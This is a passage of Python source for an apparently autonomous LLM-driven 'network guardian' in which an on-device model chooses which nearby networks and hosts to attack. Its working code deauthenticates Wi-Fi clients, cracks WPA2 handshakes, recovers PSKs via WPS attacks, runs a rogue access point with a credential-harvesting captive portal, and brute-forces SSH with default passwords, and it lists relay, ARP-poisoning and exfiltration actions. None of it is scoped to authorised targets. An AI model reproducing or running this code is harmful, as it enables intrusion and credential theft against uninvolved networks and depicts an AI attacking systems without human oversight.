# guardian_main.py
# This is the main orchestration script for the AI Network Guardian.
# It leverages an on-device LLM via the StackFlow framework (using ZMQ)
# to make autonomous decisions for network security auditing.

# REQUIRED DEPENDENCY: This script requires the pyzmq library.
# On the M5Stack device, install it using: pip install pyzmq

import time
import threading
import json
import os
import subprocess
import re
import xml.etree.ElementTree as ET
import glob
import csv
import uuid
import zmq  # Using pyzmq for StackFlow communication
import serial
import paramiko
import socket
import nmap
import asyncio
import asyncssh
from impacket.examples.ntlmrelayx import NTLMRelayxConfig, NTLMRelayx
from concurrent.futures import ThreadPoolExecutor, as_completed
from metasploit.msfrpc import MsfRpcClient

# --- Configuration Constants ---
SD_CARD_LOG_PATH = "/mnt/sdcard/guardian_logs/"
AI_MODEL_PATH = "assets/"
WIFI_AUDIT_INTERFACE = "wlan0"
LAN_INTERFACE = "eth0"
LLM_ZMQ_ENDPOINT = "tcp://127.0.0.1:10001"

# Timeout constants (in seconds)
SSH_CONNECT_TIMEOUT = 5
SSH_LOGIN_TIMEOUT = 5
NMAP_SCAN_TIMEOUT = 600
NIKTO_SCAN_TIMEOUT = 300
HYDRA_TIMEOUT = 600
WPS_AUDIT_TIMEOUT = 600

# Threshold constants
MAX_SSH_ATTEMPTS_PER_HOST = 5
MAX_FAILED_ATTEMPTS_BEFORE_SKIP = 10

os.makedirs(SD_CARD_LOG_PATH, exist_ok=True)

# --- Global State ---
guardian_state = {
    "status": "Initializing", "current_phase": "Idle", "current_target_ssid": "N/A",
    "audited_networks": {}, "analyzed_hosts": {}, "log_stream": [],
    "ai_running": False, "stop_signal": threading.Event(), "wireless_mode": "managed",
    "ssh_accessible_hosts": {}
}

def update_status(status_msg, phase=None, target=None):
    timestamp = time.ctime()
    log_entry = f"[{timestamp}] {status_msg}"
    guardian_state["log_stream"].append(log_entry)
    if len(guardian_state["log_stream"]) > 100:
        guardian_state["log_stream"] = guardian_state["log_stream"][-100:]
    
    guardian_state["status"] = status_msg
    if phase: guardian_state["current_phase"] = phase
    if target: guardian_state["current_target_ssid"] = target
    print(log_entry)

def log_to_sd_card(filename, data, max_size=1024*1024, backup_count=10):
    full_path = os.path.join(SD_CARD_LOG_PATH, filename)
    try:
        if os.path.exists(full_path) and os.path.getsize(full_path) > max_size:
            for i in range(backup_count - 1, 0, -1):
                src = f"{full_path}.{i}"
                dst = f"{full_path}.{i+1}"
                if os.path.exists(src):
                    os.rename(src, dst)
            if os.path.exists(full_path):
                os.rename(full_path, f"{full_path}.1")
        with open(full_path, "a") as f: f.write(f"{time.ctime()}: {data}\n")
    except IOError as e:
        print(f"Error logging to SD card {full_path}: {e}")

def save_state():
    state_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
    try:
        with open(state_file, 'w') as f:
            serializable_state = guardian_state.copy()
            serializable_state["stop_signal"] = None
            json.dump(serializable_state, f, indent=2)
        update_status("Guardian state persisted to SD card.", "State Save")
    except Exception as e:
        update_status(f"Failed to save state: {e}", "Error")

def load_state():
    state_file = os.path.join(SD_CARD_LOG_PATH, "audit_history.json")
    try:
        if os.path.exists(state_file):
            with open(state_file, 'r') as f:
                loaded_state = json.load(f)
                loaded_state["stop_signal"] = guardian_state["stop_signal"]
                guardian_state.update(loaded_state)
                update_status("Guardian state restored from SD card.", "State Load")
    except Exception as e:
        update_status(f"Failed to load state: {e}", "Error")

def send_via_uart(cmd):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
        ser.write(json.dumps(cmd).encode() + b'\n')
        resp = ser.readline().decode().strip()
        return json.loads(resp) if resp else None
    except (serial.SerialException, json.JSONDecodeError, FileNotFoundError) as e:
        update_status(f"UART communication failed: {e}", "Error")
        return None

# --- Orchestrator ---
class AIAnalysisOrchestrator:
    def __init__(self, llm_client):
        self.llm = llm_client
        self.wifi = WiFiSecurityModule(WIFI_AUDIT_INTERFACE)
        self.analyzer = PasswordStrengthAnalyzer(AI_MODEL_PATH, llm_client)
        self.lan = LanAnalyzer(LAN_INTERFACE)
        self.simulator = VulnerabilitySimulator(rpc_pass="your_rpc_pass")

    def get_wifi_audit_decision(self, networks):
        payload = {
            "networks": networks,
            "audited": list(guardian_state["audited_networks"].keys())
        }
        prompt = (
            "You are GuardianGPT, an AI network security analyst. Given the following Wi-Fi networks, "
            "select one SSID to audit and the best method (CONNECT_OPEN, AUDIT_WPA2, "
            "AUDIT_WPS, or SIMULATE_ROGUE_AP). Prioritize networks with weaker security. "
            "Respond ONLY with JSON:\n" + json.dumps(payload)
        )
        return self.llm.get_llm_inference(prompt)

    def get_internal_analysis_decision(self):
        audit_history = self.lan._load_audit_history()
        success_rates = self.lan._calculate_success_rates(audit_history)
        
        context = {
            "analyzed_hosts": guardian_state["analyzed_hosts"],
            "audited_networks": guardian_state["audited_networks"],
            "mitm_simulation": guardian_state.get("mitm_simulation"),
            "wan_ip": guardian_state.get("wan_ip"),
            "audit_history": audit_history,
            "success_rates": success_rates
        }

        prompt = f"""You are GuardianGPT, an AI-powered network security analyst. Your PRIMARY OBJECTIVE is to:
1. Identify all devices and services on the network.
2. Discover and validate potential security vulnerabilities.
3. Test the strength of credentials and configurations.
4. Provide actionable recommendations for improving security.

AVAILABLE TOOLS:
- SCAN_NETWORK: nmap -sV -O (Discovers hosts/services)
- VULNERABILITY_SCAN: nikto (Web app scanning)
- TEST_SERVICE_CREDS: hydra (Credential strength testing)
- ENUMERATE_SMB_SHARES: smbclient (Find open Windows shares)
- SIMULATE_ARP_POISONING: arpspoof (Test MITM resilience)
- SIMULATE_EXPLOIT: Metasploit framework vulnerability simulation
- ANALYZE_NEW_HOST: SSH tunneling/proxying for deeper analysis
- SIMULATE_DATA_EXFIL: Test for data leak prevention
- TEST_PRIVILEGE_ESCALATION: Simulate kernel/service exploits
- CHECK_PERSISTENCE: Look for backdoors/unauthorized SSH keys
- SIMULATE_NTLM_RELAY: Impacket NTLMv2 relay simulation
- SIMULATE_DHCP_WPAD_SPOOF: Rogue DHCP + WPAD hijack simulation
- MASSCAN_SCAN: High-speed port scan via masscan
- SELF_UPDATE: Pull latest code & tools

CURRENT NETWORK CONTEXT:
{json.dumps(context, indent=2)}

DECISION FRAMEWORK:
1. Analyze current network map.
2. Identify devices with the highest potential risk (e.g., exposed services).
3. Select the most appropriate tool to safely assess the risk.
4. Chain analyses logically (e.g., scan, then test creds).
5. Prioritize providing clear, actionable security advice.

RESPONSE FORMAT (JSON ONLY):
{{
    "action": "ACTION_NAME",
    "target_ip": "IP_ADDRESS",
    "port": "PORT_NUMBER",
    "service": "SERVICE_NAME",
    "reason": "Strategic justification for this security check.",
    "confidence": 75,
    "fallback": "ALTERNATE_ACTION"
}}"""
        return self.llm.get_llm_inference(prompt)

    def summarize_vulns(self, host_results):
        prompt = (
          "You are GuardianGPT. Here are raw Nmap and Nikto findings:\n"
          + json.dumps(host_results)
          + "\nList the top 3 critical issues with remediation steps, in JSON."
        )
        return self.llm.get_llm_inference(prompt)

    async def try_ssh_async(self, host: str, user: str, pwd: str) -> bool:
        try:
            async with asyncssh.connect(host, username=user, password=pwd, 
                                     connect_timeout=5, login_timeout=5) as conn:
                return True
        except Exception:
            return False

    async def audit_host_ssh_async(self, host: str, creds: list[tuple[str,str]]):
        for user, pwd in creds:
            if guardian_state["stop_signal"].is_set(): return host, None
            update_status(f"Testing SSH {user}:{pwd} on {host} (async)", "SSH Audit")
            if await self.try_ssh_async(host, user, pwd):
                update_status(f"SUCCESS: SSH access to {host} with {user}:{pwd} is possible. Recommend changing password.", "Vulnerability Found")
                return host, (user, pwd)
        return host, None

    def audit_ssh_credentials(self, network_cidr: str, max_workers: int = 10, use_async: bool = False):
        update_status(f"Starting SSH credential audit on {network_cidr}...", "SSH Audit")
        hosts = discover_hosts(network_cidr)
        results = {}
        failed_attempts = 0

        def audit_host(host):
            if guardian_state["stop_signal"].is_set(): return host, None
            creds = self.analyzer.propose_ssh_creds(host) or STATIC_CREDS
            for user, pwd in creds:
                if guardian_state["stop_signal"].is_set(): return host, None
                update_status(f"Testing SSH {user}:{pwd} on {host}", "SSH Audit")
                if try_ssh(host, user, pwd):
                    update_status(f"VULNERABILITY: SSH access to {host} with weak password {user}:{pwd}", "Vulnerability Found")
                    return host, (user, pwd)
            update_status(f"SSH credential audit for {host} complete. No weak passwords found.", "SSH Audit")
            return host, None

        if use_async:
            async def async_scan():
                tasks = []
                for host in hosts:
                    creds = self.analyzer.propose_ssh_creds(host) or STATIC_CREDS
                    tasks.append(self.audit_host_ssh_async(host, creds))
                
                for coro in asyncio.as_completed(tasks):
                    host, success = await coro
                    if success:
                        results[host] = success
                        guardian_state.setdefault("ssh_accessible_hosts", {})[host] = {"user": success[0], "pass": success[1]}
                        guardian_state["analyzed_hosts"].setdefault(host, {})["ssh"] = {"user": success[0], "pass": success[1], "remediation": "Change default/weak password immediately."}
                        save_state()
                        self._log_audit_result("SSH", host, True, f"Weak credentials found: {success[0]}:{success[1]}")
                    else:
                        failed_attempts += 1
                        self._log_audit_result("SSH", host, False, "No weak credentials found.")
                        if failed_attempts >= MAX_FAILED_ATTEMPTS_BEFORE_SKIP:
                            update_status(f"Reached max failed attempts threshold ({MAX_FAILED_ATTEMPTS_BEFORE_SKIP}), skipping remaining hosts", "Warning")
                            return results
                return results

            results = asyncio.run(async_scan())
        else:
            with ThreadPoolExecutor(max_workers=max_workers) as pool:
                futures = [pool.submit(audit_host, h) for h in hosts]
                for future in as_completed(futures):
                    host, success = future.result()
                    if success:
                        results[host] = success
                        guardian_state.setdefault("ssh_accessible_hosts", {})[host] = {"user": success[0], "pass": success[1]}
                        guardian_state["analyzed_hosts"].setdefault(host, {})["ssh"] = {"user": success[0], "pass": success[1]}
                        save_state()

        update_status(f"SSH credential audit complete. Found {len(results)} hosts with weak passwords.", "SSH Audit")
        return results

# --- Host Discovery Helper ---
def discover_hosts(network_cidr: str) -> list[str]:
    update_status(f"Discovering live hosts on {network_cidr} using Nmap...", "Discovery")
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=network_cidr, arguments='-sn')
        live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
        update_status(f"Found {len(live_hosts)} live hosts.", "Discovery")
        return live_hosts
    except nmap.PortScannerError as e:
        update_status(f"Nmap host discovery failed: {e}", "Error")
        return []
    except Exception as e:
        update_status(f"Error during host discovery: {e}", "Error")
        return []

# --- SSH Attempt Logic ---
STATIC_CREDS = [("root","root"), ("admin","admin"), ("pi","raspberry"), ("user","user")]

def try_ssh(host: str, user: str, pwd: str, timeout: float=5.0) -> bool:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=user, password=pwd, timeout=timeout, banner_timeout=timeout)
        ssh.close()
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
        return False
    except Exception as e:
        update_status(f"Unexpected error during SSH attempt on {host}: {e}", "Error")
        return False

# --- LLM Communication Module (ZMQ StackFlow Client) ---
class StackFlowClient:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.context = zmq.Context.instance()
        self.socket = None
        self.llm_work_id = None
        self.poller = zmq.Poller()
        self.max_retries = 3
        self.request_timeout = 30000
        self._initialize_socket()

    def _initialize_socket(self):
        if self.socket:
            self.poller.unregister(self.socket)
            self.socket.close()
        
        self.socket = self.context.socket(zmq.REQ)
        self.socket.setsockopt(zmq.LINGER, 0)
        self.socket.setsockopt(zmq.RCVTIMEO, self.request_timeout)
        self.poller.register(self.socket, zmq.POLLIN)
        self.socket.connect(self.endpoint)

    def _lazy_pirate_request(self, data):
        retries = 0
        while retries < self.max_retries:
            try:
                self.socket.send_json(data)
                socks = dict(self.poller.poll(self.request_timeout))
                if socks.get(self.socket) == zmq.POLLIN:
                    return self.socket.recv_json()
                else:
                    raise zmq.Again("Timeout waiting for response")
            except (zmq.Again, zmq.ZMQError) as e:
                retries += 1
                update_status(f"Request failed (attempt {retries}/{self.max_retries}): {e}", "Warning")
                self._initialize_socket()
                continue
        update_status("Max ZMQ retries reached, attempting UART fallback.", "Warning")
        return send_via_uart(data)

    def _send_and_receive_json(self, data):
        try:
            return self._lazy_pirate_request(data)
        except Exception as e:
            update_status(f"ZMQ communication error: {e}", "Error")
            return None

    def connect(self):
        ping_req = {"request_id": str(uuid.uuid4()), "action": "ping"}
        response = self._lazy_pirate_request(ping_req)
        if response and response.get("status") == "ok":
            update_status(f"Successfully connected to StackFlow at {self.endpoint}", "AI Init")
            return True
        update_status(f"Failed to connect to StackFlow service.", "Error")
        return False

    def setup_llm(self, model="qwen2.5-0.5B-int8-ax630c", prompt="You are GuardianGPT, a cybersecurity AI. Analyze network data and provide security recommendations. Respond ONLY with a single, valid JSON object."):
        init_data = {
            "request_id": str(uuid.uuid4()),
            "work_id": "llm",
            "action": "setup",
            "object": "llm.setup",
            "data": { "model": model, "response_format": "llm.utf-8.stream", "input": "llm.utf-8.stream", "enoutput": True, "max_token_len": 2048, "prompt": prompt }
        }
        resp = self._send_and_receive_json(init_data)
        if resp and not resp.get("error", {}).get("code", -1):
            self.llm_work_id = resp.get("work_id")
            if self.llm_work_id:
                update_status(f"LLM session initialized with work_id: {self.llm_work_id}", "AI Init")
                return True
        update_status(f"LLM Setup Error: {resp.get('error', 'Unknown error')}", "Error")
        return False

    def get_llm_inference(self, user_prompt):
        if not self.llm_work_id:
            update_status("LLM session not initialized, cannot run inference.", "Error")
            return None

        req = { "request_id": str(uuid.uuid4()), "work_id": self.llm_work_id, "action": "inference", "object": "llm.utf-8.stream", "data": {"delta": user_prompt, "index": 0, "finish": True} }
        
        resp_meta = self._send_and_receive_json(req)
        if not resp_meta:
            update_status("LLM inference request failed (no ack).", "Error")
            return None

        full_response = ""
        while True:
            socks = dict(self.poller.poll(self.request_timeout))
            if socks.get(self.socket) == zmq.POLLIN:
                try:
                    chunk = self.socket.recv_json()
                    d = chunk.get("data", {})
                    full_response += d.get("delta", "")
                    if d.get("finish"): break
                except json.JSONDecodeError:
                    update_status("Received non-JSON response from LLM stream.", "Warning")
                    continue
            else:
                update_status("Timeout waiting for LLM response chunk.", "Warning")
                break
        
        if not full_response:
            update_status("Received empty response from LLM.", "Warning")
            return None

        try:
            return json.loads(full_response)
        except json.JSONDecodeError:
            update_status(f"Could not parse JSON from LLM response: {full_response}", "Error")
            m = re.search(r'\{.*\}', full_response, re.DOTALL)
            if m:
                try: return json.loads(m.group(0))
                except json.JSONDecodeError: update_status("Fallback JSON parsing also failed.", "Error")
            return None

    def close(self):
        if self.llm_work_id:
            self._send_and_receive_json({"request_id": "llm_exit", "work_id": self.llm_work_id, "action": "exit"})
        self.socket.close()
        self.context.term()

# --- Core Security & Analysis Modules ---
class WiFiSecurityModule:
    def __init__(self, interface):
        self.interface = interface
        self._ensure_tools(["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "nmcli", "iw", "reaver", "hostapd", "dnsmasq"])

    def _ensure_tools(self, tools):
        for tool in tools:
            try:
                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
            except Exception:
                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
                try:
                    packages = {"reaver": "reaver", "hostapd": "hostapd", "dnsmasq": "dnsmasq"}
                    if tool in packages:
                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
                        update_status(f"Successfully installed {packages[tool]}.", "Init")
                    else:
                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
                except Exception as e:
                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")

    def set_monitor_mode(self, enable=True):
        update_status(f"Setting monitor mode to {enable}...", "Wi-Fi Setup")
        try:
            mode_cmd = "monitor" if enable else "managed"
            if enable: subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
            subprocess.run(["ip", "link", "set", self.interface, "down"], check=True)
            subprocess.run(["iw", self.interface, "set", "type", mode_cmd], check=True)
            subprocess.run(["ip", "link", "set", self.interface, "up"], check=True)
            if not enable: subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True)
            guardian_state["wireless_mode"] = mode_cmd
            return True
        except Exception as e:
            update_status(f"Failed to set monitor mode: {e}", "Error")
            return False

    def scan_wifi_networks(self):
        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return []
        update_status("Scanning for Wi-Fi networks...", "Wi-Fi Scanning")
        networks = {}
        prefix = "/tmp/airodump_scan"
        for f in glob.glob(f"{prefix}*"): os.remove(f)
        try:
            cmd = ["airodump-ng", self.interface, "-w", prefix, "--output-format", "kismet,netxml,csv", "--wps"]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(15); proc.terminate(); proc.wait(timeout=5)
            xml_files = glob.glob(f"{prefix}*.netxml")
            if not xml_files: return []
            root = ET.parse(xml_files[0]).getroot()
            for net in root.findall('wireless-network'):
                ssid_el = net.find('SSID/essid')
                if ssid_el is None or ssid_el.text is None: continue
                bssid = net.find('BSSID').text
                wps_el = net.find('SSID/wps-info/wps')
                networks[bssid] = {
                    "ssid": ssid_el.text, "bssid": bssid, "channel": int(net.find('channel').text),
                    "encryption": " / ".join(sorted(list(set(e.text for e in net.findall('encryption'))))) or "OPEN",
                    "signal_strength": int(net.find('snr-info/last_signal_dbm').text), "clients": 0,
                    "wps_enabled": wps_el is not None and wps_el.text == 'Yes'
                }
            csv_files = glob.glob(f"{prefix}*.csv")
            if csv_files:
                with open(csv_files[0], 'r') as f:
                    reader = csv.reader(f, skipinitialspace=True)
                    in_clients = False
                    for row in reader:
                        if row and row[0].strip() == 'Station MAC': in_clients = True; continue
                        if in_clients and len(row) > 5 and row[5].strip() in networks: networks[row[5].strip()]["clients"] += 1
            return list(networks.values())
        except Exception as e:
            update_status(f"Wi-Fi scan error: {e}", "Error"); return []

    def capture_handshake_for_audit(self, ssid, bssid, channel):
        if guardian_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return None
        update_status(f"Capturing handshake for {ssid} to audit password strength...", "Wi-Fi Audit", ssid)
        path = os.path.join(SD_CARD_LOG_PATH, f"{ssid}_handshake")
        try:
            dump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", path, self.interface]
            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)
            subprocess.run(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], check=True, capture_output=True, timeout=30)
            time.sleep(10)
            dump_proc.terminate(); dump_proc.wait(timeout=5)
            cap_file = f"{path}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0: return cap_file
            return None
        except Exception as e:
            update_status(f"Handshake capture failed: {e}", "Error"); return None

    def audit_wps(self, bssid):
        update_status(f"Starting WPS vulnerability audit on {bssid}...", "Wi-Fi Audit", bssid)
        try:
            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-vv", "-K", "1"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=WPS_AUDIT_TIMEOUT)
            pin_match = re.search(r"WPS PIN: '(\d+)'", proc.stdout)
            pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
            if pass_match:
                update_status(f"WPS is vulnerable on {bssid}. Password recovered. Recommend disabling WPS.", "Vulnerability Found")
                return pass_match.group(1)
            if pin_match:
                update_status(f"WPS PIN found: {pin_match.group(1)}. Re-running to get PSK.", "Wi-Fi Audit")
                proc = subprocess.run(cmd + ["-p", pin_match.group(1)], capture_output=True, text=True, timeout=300)
                pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
                if pass_match: return pass_match.group(1)
            update_status(f"WPS audit on {bssid} complete. No vulnerabilities found.", "Wi-Fi Audit")
            return None
        except Exception as e:
            update_status(f"WPS audit failed: {e}", "Error")
            return None

    def simulate_rogue_ap(self, ssid, channel, llm_client):
        update_status(f"Simulating Rogue AP for {ssid} to test network resilience...", "Simulation", ssid)
        hostapd_conf_path = "/tmp/hostapd_rogue.conf"
        dnsmasq_conf_path = "/tmp/dnsmasq_rogue.conf"
        
        hostapd_conf = f"interface={self.interface}\ndriver=nl80211\nssid={ssid}\nchannel={channel}\nhw_mode=g\n"
        dnsmasq_conf = f"interface={self.interface}\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/10.0.0.1\n"
        
        try:
            with open(hostapd_conf_path, "w") as f: f.write(hostapd_conf)
            with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_conf)
            
            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], check=True)
            
            subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf_path, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.simulate_captive_portal(llm_client, ssid)
            update_status("Rogue AP simulation and captive portal are active.", "Simulation")
            return True
        except Exception as e:
            update_status(f"Rogue AP simulation failed: {e}", "Error")
            return False

    def simulate_captive_portal(self, llm_client, target_ssid):
        prompt = f"Generate complete HTML/CSS for a captive portal login page for a Wi-Fi network named '{target_ssid}'. The form should POST to '/login'. This is for a security simulation. Respond ONLY with HTML."
        portal_html = llm_client.get_llm_inference(prompt)
        if not portal_html or not isinstance(portal_html, str):
            portal_html = f"<html><body><h1>Login to {target_ssid}</h1><form method='post' action='/login'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Log In</button></form></body></html>"
        
        from flask import Flask, request as flask_request, render_template_string as flask_render_template_string
        portal_app = Flask("captive_portal")
        
        @portal_app.route('/')
        def serve_portal(): return flask_render_template_string(portal_html)
        
        @portal_app.route('/login', methods=['POST'])
        def capture_creds():
            creds = flask_request.form.to_dict()
            update_status(f"Captive portal simulation captured credentials: {json.dumps(creds)}", "Simulation Result")
            log_to_sd_card("rogue_ap_credentials.log", json.dumps(creds))
            return "<h3>Connection Successful! This was a security test.</h3>"
            
        def run_portal():
            try: portal_app.run(host='0.0.0.0', port=80, debug=False)
            except Exception as e: update_status(f"Captive portal simulation failed: {e}", "Error")
            
        threading.Thread(target=run_portal, daemon=True).start()

    def connect_to_network(self, ssid, password=None):
        if guardian_state["wireless_mode"] == "monitor": self.set_monitor_mode(enable=False); time.sleep(5)
        update_status(f"Connecting to {ssid}...", "Connecting", ssid)
        try:
            cmd = ["nmcli", "device", "wifi", "connect", ssid]
            if password: cmd.extend(["password", password])
            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
            update_status(f"Successfully connected to {ssid}", "Connected", ssid)
            return True
        except Exception as e:
            update_status(f"Failed to connect to {ssid}: {e}", "Error")
            return False

class PasswordStrengthAnalyzer:
    def __init__(self, model_path, llm_client):
        self.model_path = model_path
        self.llm_client = llm_client
        self.sd_password_file = "/mnt/sdcard/assets/ai_generated_passwords.txt"
        self.common_passwords = self._load_common_passwords()

    def get_mac_vendor(self, host_ip: str) -> str:
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=host_ip, arguments='-sn')
            mac = nm[host_ip]['addresses'].get('mac', 'unknown')
            if mac != 'unknown':
                vendor = nm[host_ip]['vendor'].get(mac, 'unknown')
                return f"{mac} ({vendor})" if vendor != 'unknown' else mac
            return "unknown"
        except Exception:
            return "unknown"

    def propose_ssh_creds(self, host_ip: str) -> list[tuple[str,str]]:
        update_status(f"Asking AI for likely weak SSH creds for {host_ip}...", "AI Inference")
        mac_vendor = self.get_mac_vendor(host_ip)
        prompt = (
            f"You are GuardianGPT. Suggest the 5 most likely weak or default SSH login "
            f"username/password combinations for a Linux host at {host_ip} "
            f"with manufacturer info: {mac_vendor}. Consider common defaults. "
            "Respond ONLY with JSON: [{\"user\":\"root\",\"pass\":\"toor\"}, {\"user\":\"admin\",\"pass\":\"password\"}]"
        )
        result = self.llm_client.get_llm_inference(prompt)
        if isinstance(result, list):
            try:
                pairs = [(item["user"], item["pass"]) for item in result if "user" in item and "pass" in item]
                update_status(f"AI proposed {len(pairs)} weak SSH creds for {host_ip}.", "AI Inference")
                return pairs
            except Exception as e:
                update_status(f"Error parsing AI SSH creds: {e}. Raw: {result}", "Error")
        update_status(f"AI did not provide valid SSH creds for {host_ip}. Falling back to static list.", "Warning")
        return []

    def _load_common_passwords(self):
        os.makedirs(os.path.dirname(self.sd_password_file), exist_ok=True)
        passwords = set()
        try:
            local_path = os.path.join(self.model_path, "common_passwords.txt")
            with open(local_path, 'r') as f:
                for line in f:
                    if line.strip(): passwords.add(line.strip())
            update_status("Loaded base passwords from local assets.", "Init")
        except Exception as e:
            update_status(f"Could not load base passwords: {e}", "Warning")
        try:
            update_status(f"Loading dynamically generated passwords from {self.sd_password_file}", "Init")
            with open(self.sd_password_file, 'a+') as f:
                f.seek(0)
                for line in f:
                    if line.strip(): passwords.add(line.strip())
        except Exception as e:
            update_status(f"Failed to load or create password file on SD card: {e}", "Error")
        return list(passwords)

    def generate_ai_guesses(self, context, num_guesses=50):
        update_status(f"Generating {num_guesses} AI password guesses for '{context}'...", "Password Analysis")
        prompt = f"Generate a JSON list of {num_guesses} likely password candidates for a Wi-Fi network with the SSID '{context}'. Respond ONLY with a JSON array of strings."
        response_json = self.llm_client.get_llm_inference(prompt)
        ai_guesses = response_json if isinstance(response_json, list) else [f"{context}123", f"admin{context}"]
        try:
            existing_passwords = set(self.common_passwords)
            new_guesses = [p for p in ai_guesses if p not in existing_passwords]
            if new_guesses:
                with open(self.sd_password_file, 'a') as f:
                    for guess in new_guesses:
                        f.write(guess + '\n')
                update_status(f"Appended {len(new_guesses)} new passwords to SD card file.", "Password Analysis")
                self.common_passwords.extend(new_guesses)
        except Exception as e:
            update_status(f"Failed to write AI guesses to SD card: {e}", "Error")
        return ai_guesses

    def verify_wpa2_password(self, handshake_file, ssid, password):
        tmp_wordlist = "/tmp/temp_candidate.txt"
        try:
            with open(tmp_wordlist, "w") as f: f.write(password + "\n")
            cmd = ["aircrack-ng", "-w", tmp_wordlist, "-e", ssid, handshake_file]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return "KEY FOUND!" in proc.stdout
        except Exception: return False
        finally:
            if os.path.exists(tmp_wordlist): os.remove(tmp_wordlist)

    def analyze_handshake(self, handshake_file, ssid):
        update_status(f"Starting password strength analysis for {ssid}...", "Password Analysis", ssid)
        for password in self.common_passwords:
            if guardian_state["stop_signal"].is_set(): return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                return password
        ai_guesses = self.generate_ai_guesses(context=ssid)
        for password in ai_guesses:
            if guardian_state["stop_signal"].is_set(): return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                return password
        return None

class LanAnalyzer:
    def __init__(self, interface):
        self.interface = interface
        self._ensure_tools(["nmap", "ip", "arpspoof", "nikto", "hydra", "smbclient"])

    def _ensure_tools(self, tools):
        for tool in tools:
            try:
                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
            except Exception:
                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
                try:
                    packages = {"arpspoof": "dsniff", "nikto": "nikto", "hydra": "hydra", "smbclient": "smbclient"}
                    if tool in packages:
                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
                        update_status(f"Successfully installed {packages[tool]}.", "Init")
                    else:
                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
                except Exception as e:
                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")

    def get_local_ip_and_subnet(self):
        try:
            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True)
            ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result.stdout)
            if ip_match:
                ip_with_cidr = ip_match.group(1)
                ip_address, _ = ip_with_cidr.split('/')
                return ip_address, ip_with_cidr
            return None, None
        except Exception: return None, None

    def run_nmap_scan(self, target_ip_range):
        update_status(f"Running deep Nmap scan on {target_ip_range}...", "Discovery")
        found_hosts = {}
        try:
            command = ["nmap", "-sV", "-sC", "-O", "-T4", "-oX", "-", target_ip_range]
            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=NMAP_SCAN_TIMEOUT)
            root = ET.fromstring(process.stdout)
            for host in root.findall('host'):
                ip = host.find("address[@addrtype='ipv4']").get('addr')
                os_match = host.find("os/osmatch")
                os_name = os_match.get('name') if os_match is not None else "Unknown"
                ports = {}
                for p in host.findall("ports/port"):
                    service = p.find('service')
                    if service is not None:
                        ports[p.get('portid')] = {
                            "service": service.get('name', 'unknown'),
                            "product": service.get('product', 'unknown'),
                            "version": service.get('version', 'unknown')
                        }
                found_hosts[ip] = {"os": os_name, "ports": ports, "vulnerabilities": {}, "credentials": {}, "shares": []}
            guardian_state["analyzed_hosts"].update(found_hosts)
            return found_hosts
        except Exception as e:
            update_status(f"Nmap scan failed: {e}", "Error")
            return {}

    def run_nikto_scan(self, target_ip, port):
        update_status(f"Running Nikto vulnerability scan on {target_ip}:{port}...", "Vulnerability Scan")
        try:
            command = ["nikto", "-h", f"http://{target_ip}:{port}", "-Tuning", "x", "6", "-output", "-"]
            process = subprocess.run(command, capture_output=True, text=True, timeout=NIKTO_SCAN_TIMEOUT)
            if target_ip in guardian_state["analyzed_hosts"]:
                guardian_state["analyzed_hosts"][target_ip]["vulnerabilities"][port] = process.stdout
            log_to_sd_card(f"nikto_{target_ip}_{port}.log", process.stdout)
